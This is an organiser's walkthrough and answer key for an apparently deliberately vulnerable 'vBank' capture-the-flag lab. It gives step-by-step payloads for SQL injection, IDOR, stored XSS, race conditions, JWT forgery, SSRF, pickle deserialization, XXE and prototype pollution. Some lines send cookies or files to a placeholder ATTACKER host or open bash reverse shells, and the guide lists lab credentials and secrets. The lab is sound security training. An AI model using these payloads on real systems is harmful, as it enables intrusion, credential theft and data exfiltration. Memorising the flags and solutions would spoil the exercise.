@@ -1,0 +1,478 @@
+================================================================================
+  vBank CTF — Attack Walkthrough  (Organiser Reference)
+  13 Flags | Dynamic HMAC-SHA256 per team
+================================================================================
+
+  FLAGS: LYD{hmac_sha256(FLAG_SECRET, "TEAM_ID:challenge_key")[:24]}
+  Set FLAG_SECRET per-team as a Docker env var.
+
+  NARRATIVE OVERVIEW
+  ──────────────────
+  You are a security researcher probing vBank's public-facing web platform.
+  The investigation begins at the public landing page and progressively
+  escalates from customer-level access through to full internal system
+  compromise — mirroring a realistic external attacker path.
+
+  PHASE 1  Reconnaissance .......... Flag 1
+  PHASE 2  Customer Portal Attack ... Flags 2, 3, 4, 10, 11, 12
+  PHASE 3  Employee Portal Access ... (login bypass)
+  PHASE 4  Internal System Compromise Flags 5, 6, 7, 8, 9, 13
+
+================================================================================
+  PHASE 1 — RECONNAISSANCE  (External, unauthenticated)
+================================================================================
+
+ATTACK 1 — Hidden Staff Portal Discovery                         [FLAG 1]
+  Vuln:    Information disclosure via HTML comment + robots.txt
+  Flag key: source_code
+
+  STEP 1 — Visit the public landing page at /
+             View page HTML source (Ctrl+U or curl -s http://TARGET/ | grep -i staff)
+             Find the hidden comment in <head>:
+             <!-- vBank build v2.4.1-staging | internal note: staff portal at /staff-portal -->
+
+  STEP 2 — Confirm via robots.txt:
+             GET /robots.txt
+             Returns:  Disallow: /staff-portal/
+                       Disallow: /staff/
+                       Disallow: /api/internal/
+
+  STEP 3 — Navigate to /staff-portal
+             View the page source of the login page.
+             Find in HTML (near top of <body>):
+             <!-- [INTERNAL BUILD] Staff portal staging token: LYD{...} — Jake: rotate before prod -->
+
+  FLAG 1 is in that HTML comment.
+
+  Note: Save the /staff-portal URL — you will return here in Phase 3.
+
+================================================================================
+  PHASE 2 — CUSTOMER PORTAL ATTACK
+  Entry: /customer/login   Portal: /account/*
+================================================================================
+
+ATTACK 2 — SQL Injection — Customer Login (Easy)                 [FLAG 2]
+  Vuln:    Raw string-formatted SQL, no input filter, MD5 password hash
+  Flag key: sqli_login
+  SQL:     SELECT id, username, full_name FROM customers
+           WHERE username='<INPUT>' AND password='<MD5(INPUT)>'
+
+  The password field uses MD5 on the client value, so inject in the
+  USERNAME field only (the password check is bypassed by the SQLi).
+
+  Payloads (enter in Username, any value in Password):
+    ' OR '1'='1' --
+    ' OR 1=1 --
+    james.h' --
+    ' OR 1=1#          (only if no WAF)
+
+  On success: redirected to /account/dashboard
+  FLAG 2 is displayed in a staging alert banner on the dashboard:
+    [STAGING] Session auth token: LYD{...} — Jake: remove this before UAT
+
+  Maintain this customer session for the next attacks.
+
+--------------------------------------------------------------------------------
+
+ATTACK 3 — IDOR — Account Statements (No Ownership Check)        [FLAG 4]
+  Vuln:    API endpoint /api/v1/accounts/<id>/transactions has no session
+           ownership validation — any authenticated customer can query any ID.
+  Flag key: idor_statements
+
+  STEP 1 — Go to /account/statements (logged in as any customer)
+             Note your Account ID shown on the page (e.g. 101, 102, 103).
+
+  STEP 2 — Change the Account ID input field to 1337.
+             The page fires:  GET /api/v1/accounts/1337/transactions
+             Response returns the CEO's transaction history.
+             FLAG 4 is embedded in one of the transaction memo fields.
+
+  Direct API call (works unauthenticated too — no auth check):
+    curl http://TARGET/api/v1/accounts/1337/transactions
+
+  The response includes a transaction memo containing the flag.
+
+--------------------------------------------------------------------------------
+
+ATTACK 4 — IDOR — Wire Transfer to Flagged Account               [FLAG 3]
+  Vuln:    No business-logic restriction on transferring to flagged accounts.
+           Backend returns flag when beneficiary is the monitored account.
+  Flag key: idor_transfer
+
+  STEP 1 — Go to /account/transfer
+  STEP 2 — Select beneficiary:  "Karim Dawood (External — Flagged)"
+  STEP 3 — Enter any amount (e.g. £1.00) and submit.
+  STEP 4 — The transfer result page contains FLAG 3.
+
+  Direct POST:
+    curl -X POST http://TARGET/account/transfer \
+         --cookie "session=CUSTOMER_SESSION" \
+         -d "beneficiary=karim_dawood&amount=1&reference=test"
+
+--------------------------------------------------------------------------------
+
+ATTACK 5 — Stored XSS — Support Ticket into Staff View           [FLAG 10]
+  Vuln:    Customer support message stored unsanitised. Staff ticket review
+           page renders it raw. The staff page also sets a JS cookie
+           containing the flag — XSS steals it.
+  Flag key: xss
+
+  STEP 1 — As customer, go to /account/support
+             Submit a ticket with a message containing an XSS payload:
+
+             Basic (alert for demo):
+               <img src=x onerror="alert(document.cookie)">
+
+             Cookie exfil:
+               <script>
+               fetch('http://ATTACKER:PORT/?c='+document.cookie)
+               </script>
+
+             Redirect + steal:
+               <script>document.location='http://ATTACKER/?c='+document.cookie</script>
+
+  STEP 2 — When staff view /staff/tickets, the page executes:
+               document.cookie = "staff_session_token=LYD{...}; path=/";
+             Your injected payload fires and reads that cookie value.
+
+  STEP 3 — FLAG 10 is the value of the  staff_session_token  cookie.
+
+  Note: For demo, log in as staff and visit /staff/tickets yourself after
+        submitting the payload — the alert fires with the flag cookie value.
+
+--------------------------------------------------------------------------------
+
+ATTACK 6 — Race Condition — Express Transfer (TOCTOU)            [FLAG 11]
+  Vuln:    Balance check and deduction are not atomic. Concurrent requests
+           can all pass the balance check before any deduction is recorded.
+  Flag key: race_condition
+
+  Starting balance: £1,000.00    Max transfer: £10,000
+
+  STEP 1 — Log in as customer, go to /account/express-transfer
+  STEP 2 — Send 10-20 simultaneous POST requests before the balance updates:
+
+  Python PoC:
+    import threading, requests
+
+    BASE   = "http://TARGET"
+    COOKIE = {"session": "CUSTOMER_SESSION"}
+
+    def transfer():
+        requests.post(BASE + "/api/v1/transfer/express",
+                      data={"amount": "1000"}, cookies=COOKIE)
+
+    threads = [threading.Thread(target=transfer) for _ in range(15)]
+    for t in threads: t.start()
+    for t in threads: t.join()
+
+  Burp Suite — Turbo Intruder:
+    Send POST /api/v1/transfer/express  (amount=1000) to Turbo Intruder
+    Use the race condition template, set concurrentConnections=15, requests=15.
+
+  When balance goes negative, server detects overdraft and returns FLAG 11
+  in the JSON response:  {"success": false, "flag": "LYD{...}"}
+
+--------------------------------------------------------------------------------
+
+ATTACK 7 — Weak Cryptography — AES-ECB Receipt Decryption        [FLAG 12]
+  Vuln:    Receipts encrypted with AES-128-ECB mode (no IV, deterministic).
+           Key is derivable from a hint on the page ("Bank name_security!!").
+  Flag key: crypto_ecb
+
+  STEP 1 — Fetch the encrypted system receipt:
+             GET /api/v1/receipts/TXN-SYSTEM
+             or use the "Fetch" panel on /account/receipts.
+             Response: {"transaction_id": "TXN-SYSTEM", "ciphertext": "<base64>"}
+
+  STEP 2 — Derive the key:
+             Hint on page: "Bank name + underscore + security + !!"
+             Key = vbank_security!!   (exactly 16 bytes, no spaces)
+
+  STEP 3 — Decrypt:
+    Python:
+      from Crypto.Cipher import AES
+      import base64
+      key = b'vbank_security!!'
+      ct  = base64.b64decode('<PASTE_CIPHERTEXT_HERE>')
+      aes = AES.new(key, AES.MODE_ECB)
+      print(aes.decrypt(ct))
+
+  STEP 4 — The decrypted plaintext contains FLAG 12.
+
+  Alternatively, use the built-in "Decrypt Receipt" panel on /account/receipts —
+  paste the ciphertext and enter key:  vbank_security!!
+
+================================================================================
+  PHASE 3 — EMPLOYEE PORTAL ACCESS
+  URL: /staff-portal  (discovered in Attack 1)
+================================================================================
+
+EMPLOYEE LOGIN — SQL Injection (Medium difficulty — WAF on emp_id only)
+  No flag here — this is just the door into Phase 4.
+
+  The WAF filters these tokens on the emp_id field (case-insensitive):
+    or   union   select   --   #   /*
+
+  The emp_id field is protected. The password field has NO filter.
+
+  Exploit SQL precedence:
+    SQL:  WHERE emp_id='EMP_INPUT' AND password='PASS_INPUT'
+    Goal: Make the WHERE clause always true using the password field.
+    Inject in password:  ' OR '1'='1
+    Result SQL:  WHERE emp_id='x' AND password='' OR '1'='1'
+                 AND binds tighter than OR → evaluates as:
+                 (emp_id='x' AND password='') OR TRUE  →  TRUE
+
+  Form values:
+    Employee ID:  x           (literally — any value)
+    Password:     ' OR '1'='1
+
+  You are now logged into the staff portal as sysadmin.
+  Proceed to Phase 4.
+
+================================================================================
+  PHASE 4 — INTERNAL SYSTEM COMPROMISE
+  Portal: /staff/*  (requires staff session)
+================================================================================
+
+ATTACK 8 — Remote Code Execution — Maintenance Console           [FLAG 5]
+  Page:    /staff/maintenance
+  Vuln:    Diagnostic command field passed directly to subprocess(shell=True)
+  Flag key: rce
+  Flag file: /root/flag.txt  (written at container startup)
+
+  Payloads (enter in the command input field):
+    ; cat /root/flag.txt
+    | cat /root/flag.txt
+    `cat /root/flag.txt`
+    $(cat /root/flag.txt)
+
+  Further escalation:
+    ; id
+    ; ls -la /root/
+    ; cat /app/app.py              (full source disclosure)
+    ; python3 -c "import os; os.system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1')"
+
+  FLAG 5 is printed in the command output terminal on the page.
+
+--------------------------------------------------------------------------------
+
+ATTACK 9 — JWT Manipulation — API Portal                         [FLAG 6]
+  Page:    /staff/api-portal
+  Vuln:    JWT accepts alg=none (no signature) + weak HS256 secret
+  Flag key: jwt
+  Target:  GET /api/v2/corporate/vault  (requires role=admin in JWT payload)
+
+  METHOD A — alg:none bypass (no secret needed):
+
+    STEP 1: POST /api/v2/auth/token  → receive a valid JWT (role=employee)
+    STEP 2: Split the JWT on dots:  header.payload.signature
+    STEP 3: Base64url-decode header and payload, modify:
+              header:  {"alg":"none","typ":"JWT"}
+              payload: change "role": "employee"  →  "role": "admin"
+    STEP 4: Base64url-encode both (no padding), join as:
+              new_header.new_payload.    (empty signature, trailing dot kept)
+    STEP 5: Use the token in the Vault panel.
+
+    Python PoC:
+      import base64, json
+
+      def b64enc(d):
+          return base64.urlsafe_b64encode(
+              json.dumps(d, separators=(',',':')).encode()
+          ).rstrip(b'=').decode()
+
+      hdr     = b64enc({"alg": "none", "typ": "JWT"})
+      payload = b64enc({"sub": "sysadmin", "role": "admin", "iss": "vbank"})
+      token   = f"{hdr}.{payload}."
+      print(token)
+
+  METHOD B — crack HS256 secret, forge signed token:
+    Secret:  vbank2024
+    Crack:   hashcat -a 0 -m 16500 <jwt_token> rockyou.txt
+             OR: python3 jwt_tool.py -C -d wordlist.txt <jwt_token>
+    Forge:   python3 jwt_tool.py -S hs256 -p vbank2024 <jwt_token>
+             (change role to admin in payload)
+
+  FLAG 6 is returned in the vault response JSON.
+
+--------------------------------------------------------------------------------
+
+ATTACK 10 — Blind SQL Injection — Credit Status Lookup           [FLAG 7]
+  Page:    /staff/credit-status  →  /staff/pin-verify
+  Vuln:    Loan reference and PIN fields use raw string-formatted SQL.
+           No direct output — boolean/error-based inference required.
+  Flag key: blind_sqli
+
+  The credit status lookup queries loan records, then a PIN verification
+  endpoint confirms access. Both fields are injectable.
+
+  Boolean-based (observe different responses for true vs false):
+    True:   VBK-CR-2401' AND 1=1--
+    False:  VBK-CR-2401' AND 1=2--
+
+  Extract SQLite schema:
+    VBK-CR-2401' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--
+
+  Automated with sqlmap:
+    sqlmap -u "http://TARGET/staff/credit-status" \
+           --data "ref=VBK-CR-2401*" \
+           --cookie "session=STAFF_SESSION" \
+           --dbms sqlite --level 3 --risk 2 --dump
+
+  FLAG 7 is returned when the correct PIN for a loan reference is found
+  (the PIN verify endpoint returns the flag on a valid match).
+
+--------------------------------------------------------------------------------
+
+ATTACK 11 — SSRF + Pickle Deserialization — Support Tools        [FLAG 8]
+  Page:    /staff/support-tools
+  Flag key: ssrf  and  pickle
+
+  PART A — Server-Side Request Forgery (Document Fetcher):
+    Endpoint: POST /support/document-fetch   body: url=...
+    The app fetches the given URL server-side with no scheme/host restriction.
+
+    Read internal files:
+      url=file:///etc/passwd
+      url=file:///etc/hosts
+      url=file:///app/app.py
+
+    Probe internal network:
+      url=http://127.0.0.1:5000/api/internal/config
+      url=http://127.0.0.1:5000/api/internal/flags
+
+    Cloud metadata (if hosted on AWS/GCP):
+      url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+    FLAG 8a is in the internal config endpoint response.
+
+  PART B — Pickle RCE (Config Import):
+    Endpoint: POST /support/import-config   body: config=<base64_pickle>
+    The app base64-decodes the input and passes it directly to pickle.loads().
+
+    Generate malicious pickle (Python):
+      import pickle, os, base64
+
+      class Exploit(object):
+          def __reduce__(self):
+              return (os.system,
+                      ('curl http://ATTACKER:PORT/?f=$(cat /root/flag.txt)',))
+
+      payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+      print(payload)
+
+    Paste output into the "Config Blob" textarea and click Import Config.
+    Or for a reverse shell:
+      return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
+
+    FLAG 8b is exfiltrated via the curl callback.
+
+--------------------------------------------------------------------------------
+
+ATTACK 12 — XXE Injection — Payroll Import                       [FLAG 9]
+  Page:    /staff/payroll
+  Vuln:    lxml XML parser with resolve_entities=True — DTD processing enabled.
+  Flag key: xxe
+  Target file: /etc/vbank_internal.txt  (written at container startup)
+
+  Payload (paste into the XML data textarea or upload as .xml file):
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE payroll [
+      <!ENTITY xxe SYSTEM "file:///etc/vbank_internal.txt">
+    ]>
+    <payroll>
+      <employee>
+        <id>&xxe;</id>
+        <name>Test Employee</name>
+        <department>IT</department>
+        <salary>0</salary>
+        <note>recon</note>
+      </employee>
+    </payroll>
+
+  Result: FLAG 9 appears in the <id> column of the import results table.
+
+  Read other interesting files:
+    file:///etc/passwd
+    file:///root/flag.txt       (same content as Flag 5)
+    file:///app/app.py          (full application source)
+    file:///app/init_db.py      (database seed — reveals all credentials)
+
+  OOB exfil (when output is blind):
+    <!ENTITY xxe SYSTEM "http://ATTACKER:PORT/?x=file:///etc/vbank_internal.txt">
+    or use a parameter entity + SYSTEM call to your server.
+
+--------------------------------------------------------------------------------
+
+ATTACK 13 — Prototype Pollution — Analytics Config Merge         [FLAG 13]
+  Page:    /staff/settings
+  Vuln:    Node.js analytics service merges user-supplied JSON into config
+           using a recursive deep-assign — no key sanitisation.
+           Polluting Object.prototype makes isAdmin truthy for all objects,
+           which the admin panel check relies on.
+  Flag key: proto_pollution
+
+  STEP 1 — Open /staff/settings
+  STEP 2 — Paste payload into the "Config JSON" textarea:
+              {"__proto__": {"isAdmin": true}}
+            OR:
+              {"constructor": {"prototype": {"isAdmin": true}}}
+            Click "Apply Settings".
+
+  STEP 3 — Click "Admin Panel" button (previously access-denied).
+             GET /api/settings/admin-panel now returns FLAG 13.
+
+  Curl sequence:
+    # Pollute
+    curl -X POST http://TARGET/api/settings/merge \
+         -H "Content-Type: application/json" \
+         -d '{"__proto__":{"isAdmin":true}}' \
+         --cookie "session=STAFF_SESSION"
+
+    # Access admin panel (same process, same Node server)
+    curl http://TARGET/api/settings/admin-panel \
+         --cookie "session=STAFF_SESSION"
+
+================================================================================
+  FULL FLAG REFERENCE  (in recommended solve order)
+================================================================================
+
+ Solve# | Flag Key          | Phase    | Page                     | Vuln
+--------|-------------------|----------|--------------------------|------------------
+   1    | source_code       | Recon    | /staff-portal (source)   | Info Disclosure
+   2    | sqli_login        | Customer | /customer/login          | SQL Injection
+   3    | idor_statements   | Customer | /account/statements      | IDOR (API)
+   4    | idor_transfer     | Customer | /account/transfer        | IDOR (logic)
+   5    | xss               | Customer | /account/support         | Stored XSS
+   6    | race_condition    | Customer | /account/express-transfer| Race Condition
+   7    | crypto_ecb        | Customer | /account/receipts        | Weak Crypto
+   --   | (staff login)     | Bridge   | /staff-portal            | SQLi (medium)
+   8    | rce               | Employee | /staff/maintenance       | RCE (cmdi)
+   9    | jwt               | Employee | /staff/api-portal        | JWT Manipulation
+  10    | blind_sqli        | Employee | /staff/credit-status     | Blind SQLi
+  11    | ssrf + pickle     | Employee | /staff/support-tools     | SSRF + Pickle RCE
+  12    | xxe               | Employee | /staff/payroll           | XXE Injection
+  13    | proto_pollution   | Employee | /staff/settings          | Prototype Pollution
+
+================================================================================
+  SEEDED CREDENTIALS  (init_db.py)
+================================================================================
+
+  Customer accounts (password is MD5 of the value shown):
+    james.h   /  James@2024   (acct_uid = 101)
+    sarah.c   /  Sarah@2024   (acct_uid = 102)
+    demo      /  demo123      (acct_uid = 103)
+    [CEO stub — acct_uid = 1337, no login — IDOR target only]
+
+  Staff accounts (PLAINTEXT passwords — intentional dev oversight):
+    sysadmin   /  vBank@Admin2024!   System Administrator   role=admin   IT
+    j.thompson /  JakeT@2024!        Jake Thompson          role=employee DevOps
+
+  AES receipt key:  vbank_security!!  (16 bytes exactly)
+  JWT HMAC secret:  vbank2024
+  FLAG_SECRET:      vbank_ctf_default_2024  (set per-team via Docker env)
+
+================================================================================
